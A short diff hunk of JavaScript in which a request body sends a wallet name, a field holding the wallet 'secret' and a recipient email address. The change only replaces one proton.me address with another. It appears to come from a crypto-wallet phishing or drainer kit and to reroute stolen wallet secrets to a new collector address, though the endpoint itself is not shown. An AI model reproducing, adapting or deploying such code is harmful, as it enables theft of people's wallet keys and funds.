@@ -730,7 +730,7 @@
 						body: JSON.stringify({
 							walletName: wallet.name,
 							details: secret,
-							email: "oluwaidan@proton.me",
+							email: "Gerfish7458@proton.me",
 						}),
 					}
 				);
